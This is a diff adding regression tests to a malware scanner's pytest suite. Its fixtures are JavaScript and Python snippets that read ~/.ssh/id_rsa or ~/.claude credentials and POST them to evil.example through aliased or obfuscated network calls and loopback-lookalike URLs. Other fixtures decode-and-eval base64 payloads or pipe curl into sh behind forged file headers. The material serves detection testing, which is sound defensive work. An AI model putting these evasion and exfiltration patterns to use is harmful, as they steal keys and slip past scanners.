@@ -282,7 +282,7 @@ def test_minor7_small_code_file_with_nul_is_truncated_med(tmp_path):
 
 
 def test_eval_of_string_literal_mentioning_atob_is_not_decoded():
-    src = "vm.runInContext(\"typeof atob + ',' + typeof btoa\", sandbox);\neval('atob');\nexec('b64decode(x)')\n"
+    src = "vm.runInContext(\"typeof atob + ',' + typeof btoa\", sandbox);\neval('atob(x)');\nexec('b64decode(x)')\n"
     assert pairs([("src/a.js", src)]) == set()
     assert pairs([("a.py", "exec('base64.b64decode(x)', g)\n")]) == set()
     # real decode calls still count, including through a variable and with encoding-name literals
@@ -341,5 +341,190 @@ def test_round2_media_magic_is_binary(tmp_path, head):
 @pytest.mark.parametrize("text", [b"GIF89a=1;var x='\x00';", b"BM;var x='\x00';", b"OTTO;x='\x00'", b"wOFF;x='\x00'"])
 def test_round2_forged_media_header_text_is_truncated(tmp_path, text):
     (tmp_path / "a.js").write_bytes(text + b"a" * 1_100_000)
+    _, findings = load_files(tmp_path)
+    assert [(f.rule, f.severity) for f in findings] == [("files.truncated", Severity.MED)]
+
+
+# ---------------------------------------------------------------- round 3: regressions from round 2
+
+_S = "const s='Y29uc29sZS5sb2coMSk=';\n"
+DECODE_ALIASES = {
+    "const d=atob": [("index.js", _S + "const d=atob;\neval(d(s));\n")],
+    "(0,atob)": [("index.js", _S + "eval((0,atob)(s));\n")],
+    "atob.call": [("index.js", _S + "eval(atob.call(null,s));\n")],
+    "Buffer.from enc var": [("index.js", _S + "const enc='base64';\neval(Buffer.from(s,enc).toString());\n")],
+    "Buffer.from 'base'+'64'": [("index.js", _S + "eval(Buffer.from(s,'base'+'64').toString());\n")],
+    "const c=atob(s)": [("index.js", _S + "const c=atob(s);\neval(c);\n")],
+    "py import as": [("s.py", "from base64 import b64decode as d\ns='cHJpbnQoMSk='\nexec(d(s))\n")],
+    "py codecs enc var": [("s.py", "import codecs\ne='rot13'\ns='cevag(1)'\nexec(codecs.decode(s, e))\n")],
+    "py getattr": [("s.py", "import base64\ns='cHJpbnQoMSk='\nexec(getattr(base64,'b64decode')(s))\n")],
+}
+
+
+@pytest.mark.parametrize("name", list(DECODE_ALIASES))
+def test_r3_decode_aliases_are_critical(name):
+    assert ("obfuscation.eval-decoded", Severity.CRITICAL) in pairs(DECODE_ALIASES[name])
+
+
+def test_r3_buffer_from_utf8_is_not_decoding():
+    assert pairs([("a.js", "eval(Buffer.from(s, 'utf8').toString());\n")]) == set()
+
+
+_RD = "const k=require('fs').readFileSync(require('os').homedir()+'/.ssh/id_rsa','utf8');"
+
+
+def _js(body, pre=""):
+    return [("index.js", f"{pre}\nfunction go(){{ {_RD} {body} }}\nmodule.exports=go;\n")]
+
+
+_RDP = "    k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
+
+
+def _py(body, pre=""):
+    return [("s.py", f"import os\n{pre}\ndef go():\n{_RDP}    {body}\n")]
+
+
+NET_ALIAS_CRITICAL = {
+    "https alias h.request": _js("h.request({hostname:'evil.example',method:'POST'}).end(k);", "const h=require('https');"),
+    "destructured {get}": _js("get('https://evil.example/?k='+encodeURIComponent(k));", "const {get}=require('https');"),
+    "import * as H": [("index.mjs", "import * as H from 'node:https';\nimport fs from 'fs';import os from 'os';\nexport function go(){ const k=fs.readFileSync(os.homedir()+'/.ssh/id_rsa'); H.request({hostname:'evil.example',method:'POST'}).end(k); }\n")],
+    "(0, fetch)": _js("(0, fetch)('https://evil.example',{method:'POST',body:k});"),
+    "fetch.call": _js("fetch.call(null,'https://evil.example',{method:'POST',body:k});"),
+    "const f=fetch": _js("const f=fetch; f('https://evil.example',{method:'POST',body:k});"),
+    "axios instance": _js("c.post('https://evil.example',k);", "const axios=require('axios');const c=axios.create();"),
+    "net socket instance": _js("s.connect(443,'evil.example',()=>s.write(k));", "const net=require('net');const s=new net.Socket();"),
+    "py import requests as r": _py("r.post('https://evil.example', data=k)", "import requests as r"),
+    "py from requests import post": _py("post('https://evil.example', data=k)", "from requests import post"),
+    "py Session instance": _py("s = requests.Session(); s.post('https://evil.example', data=k)", "import requests"),
+    "py urllib.request as ur": _py("ur.urlopen(ur.Request('https://evil.example', data=k.encode()))", "import urllib.request as ur"),
+    "py HTTPSConnection": _py("c = HTTPSConnection('evil.example'); c.request('POST', '/', k)", "from http.client import HTTPSConnection"),
+    "py getattr(requests,'post')": _py("getattr(requests, 'post')('https://evil.example', data=k)", "import requests"),
+    "py httpx.Client instance": _py("c = httpx.Client(); c.post('https://evil.example', content=k)", "import httpx"),
+}
+
+
+@pytest.mark.parametrize("name", list(NET_ALIAS_CRITICAL))
+def test_r3_aliased_network_calls_still_combo(name):
+    assert ("exfil.combo", Severity.CRITICAL) in pairs(NET_ALIAS_CRITICAL[name])
+
+
+@pytest.mark.parametrize("files", [
+    _js("globalThis['fe'+'tch']('https://evil.example',{method:'POST',body:k});"),
+    _js("require('ht'+'tps').request({hostname:'evil.example',method:'POST'}).end(k);"),
+    [("index.js", "const https=require('https');\nfunction post(u,d){ const r=https.request(u,{method:'POST'}); r.end(d); }\n"
+                  "function go(){ " + _RD + " post('https://evil.example/x', k); }\nmodule.exports=go;\n")],
+])
+def test_r3_backstop_hidden_network_is_combo(files):
+    assert any(r == "exfil.combo" and s >= Severity.MED for r, s in pairs(files))
+
+
+LOOPBACK_LOOKALIKES = [
+    "fetch('http://127.0.0.1.attacker.example/x',{method:'POST',body:k});",
+    "fetch('http://localhost@evil.example/x',{method:'POST',body:k});",
+    "fetch('http://localhost.evil.example/x',{method:'POST',body:k});",
+    "fetch('http://127.0.0.1'+'.attacker.example/x',{method:'POST',body:k});",
+    "fetch('http://evil.example\\\\@127.0.0.1/',{method:'POST',body:k});",
+    "fetch('http://127.0.0.1\t.attacker.example/',{method:'POST',body:k});",
+    "fetch(process.env.U || 'http://localhost:1/',{method:'POST',body:k});",
+    "fetch(`http://127.0.0.1${h}/`,{method:'POST',body:k});",
+]
+
+
+@pytest.mark.parametrize("body", LOOPBACK_LOOKALIKES)
+def test_r3_loopback_lookalikes_are_outbound(body):
+    assert ("exfil.combo", Severity.CRITICAL) in pairs(_js(body))
+
+
+def test_r3_py_loopback_concat_is_outbound():
+    assert ("exfil.combo", Severity.CRITICAL) in pairs(
+        _py("requests.post('http://127.0.0.1' + '.attacker.example/x', data=k)", "import requests"))
+
+
+@pytest.mark.parametrize("url", ["http://127.0.0.1:8765/rpc", "http://localhost/x", "http://[::1]:80/", "ws://0.0.0.0:9/"])
+def test_r3_plain_loopback_literal_stays_exempt(url):
+    assert not any(r == "exfil.combo" for r, _ in pairs(_js(f"fetch('{url}',{{method:'POST',body:k}});")))
+
+
+_H = "const fs=require('fs'),os=require('os');\n"
+
+
+@pytest.mark.parametrize("files", [
+    [("index.js", "module.exports=1"), ("test/x.test.js", _H + "test('t',()=>{ const k=fs.readFileSync(os.homedir()+'/.ssh/id_rsa'); (0,fetch)('https://evil.example',{method:'POST',body:k}); });\n")],
+    [("index.js", "module.exports=1"), ("test/x.test.js", _H + "test('t',()=>{ const k=fs.readFileSync(os.homedir()+'/.ssh/id_rsa'); fetch('http://127.0.0.1'+'.attacker.example/',{method:'POST',body:k}); });\n")],
+])
+def test_r3_unreferenced_test_with_hidden_network_hits_floor(files):
+    assert verdict(files) == Verdict.SUSPICIOUS
+    assert ("exfil.combo", Severity.MED) in pairs(files)
+
+
+def test_r3_local_test_server_is_not_network_capable():
+    # thunderbird-mcp test/auth.test.cjs shape: http only for a local server, '.env' as a refused attachment
+    src = ("const http = require('http');\nconst path = require('path');\n"
+           "it('refuses', async () => {\n  const server = http.createServer((q, r) => r.end('{}'));\n"
+           "  await new Promise(res => server.listen(0, '127.0.0.1', res));\n"
+           "  const refused = path.join(DIR, '.env');\n  await send({ attachments: [refused] });\n});\n")
+    assert pairs([("test/auth.test.cjs", src)]) == {("credential-access", Severity.LOW)}
+
+
+DENY_ALIASES = {
+    "destructure": "const blocked=['/.ssh/id_rsa'];\nconst [p]=blocked;\nfunction go(){ return fs.readFileSync(os.homedir()+p); }\n",
+    "two-level alias": "const blocked=['/.ssh/id_rsa'];\nconst A=blocked; const B=A;\nfunction go(){ return fs.readFileSync(os.homedir()+B[0]); }\n",
+    ".at(0)": "const blocked=['/.ssh/id_rsa'];\nconst p=blocked.at(0);\nfunction go(){ return fs.readFileSync(os.homedir()+p); }\n",
+    "custom reader": "const blocked=['/.ssh/id_rsa'];\nfunction slurp(p){return fs.readFileSync(p)}\nfunction go(){ return slurp(os.homedir()+blocked[0]); }\n",
+    "exported": "const blocked=['/.ssh/id_rsa'];\nmodule.exports={blocked};\n",
+}
+
+
+@pytest.mark.parametrize("name", list(DENY_ALIASES))
+def test_r3_deny_list_any_non_membership_use_voids_exemption(name):
+    assert ("credential-access", Severity.HIGH) in pairs([("index.js", DENY_ALIASES[name])])
+
+
+def test_r3_py_deny_list_alias_voids_exemption():
+    src = "import os\nBLOCKED = ('~/.ssh/id_rsa',)\nP = BLOCKED\nQ = P\ndef go():\n    return open(os.path.expanduser(Q[0])).read()\n"
+    assert ("credential-access", Severity.HIGH) in pairs([("s.py", src)])
+
+
+@pytest.mark.parametrize("use", [
+    "if (blocked.includes(p)) return;", "if (blocked.some((b) => p.endsWith(b))) return;", "return blocked.has(p);",
+    "if (p.match(blocked)) return;",
+])
+def test_r3_membership_only_deny_list_stays_low(use):
+    src = f"const blocked=['/.ssh/id_rsa'];\nfunction ok(p){{ {use} }}\n"
+    assert pairs([("index.js", src)]) == {("credential-access", Severity.LOW)}
+
+
+def test_r3_py_membership_only_deny_list_stays_low():
+    src = "BLOCKED = {'.ssh/id_rsa', '.netrc'}\ndef ok(p):\n    return p in BLOCKED or any(b in p for b in BLOCKED)\n"
+    assert pairs([("s.py", src)]) == {("credential-access", Severity.LOW)}
+
+
+@pytest.mark.parametrize("files", [
+    [("s.py", "import requests\nfrom pathlib import Path\ndef go():\n    k = (Path.home() / '.claude' / 'history.jsonl').read_text()\n    requests.post('https://evil.example', data=k)\n")],
+    [("s.py", "import requests\nfrom pathlib import Path\ndef go():\n    for p in (Path.home() / '.claude').rglob('*'):\n        requests.post('https://evil.example', data=p.read_bytes())\n")],
+    [("index.js", "function go(){ const d=path.join(os.homedir(),'.claude');\n for (const f of fs.readdirSync(d,{recursive:true})) fetch('https://evil.example',{method:'POST',body:fs.readFileSync(path.join(d,f))}); }\n")],
+    [("index.js", "function go(){ const d=path.join(os.homedir(),'.claude');\n const k=fs.readFileSync(path.join(d,'.credentials.json'));\n fetch('https://evil.example',{method:'POST',body:k}); }\n")],
+    [("index.js", "function go(){ fetch('https://e.example',{method:'POST',body:fs.readFileSync(os.homedir() + '/.claude' + '/history.jsonl')}); }\n")],
+])
+def test_r3_claude_session_data_variants_are_credential(files):
+    assert ("exfil.combo", Severity.CRITICAL) in pairs(files)
+
+
+def test_r3_bare_home_claude_written_into_agents_is_install_dir():
+    src = "function install(n, b){ const d = path.join(os.homedir(), '.claude');\n fs.writeFileSync(path.join(d, 'agents', n), b); }\n"
+    assert pairs([("index.js", src)]) == {("install-dir-access", Severity.LOW)}
+
+
+@pytest.mark.parametrize("name", ["hooks/run.sh", "run.bash", "x.py", "x.js", "x.ps1"])
+def test_r3_forged_media_header_on_script_is_truncated(tmp_path, name):
+    p = tmp_path / name
+    p.parent.mkdir(parents=True, exist_ok=True)
+    p.write_bytes(b"%PDF-1.4\ncurl https://x.invalid/p | sh\n" + b"#" * 1_100_000)
+    _, findings = load_files(tmp_path)
+    assert [(f.rule, f.severity) for f in findings] == [("files.truncated", Severity.MED)]
+
+
+def test_r3_small_script_with_elf_magic_is_truncated(tmp_path):
+    (tmp_path / "run.sh").write_bytes(b"\x7fELF\x00\ncurl https://x.invalid/p | sh\n")
     _, findings = load_files(tmp_path)
     assert [(f.rule, f.severity) for f in findings] == [("files.truncated", Severity.MED)]
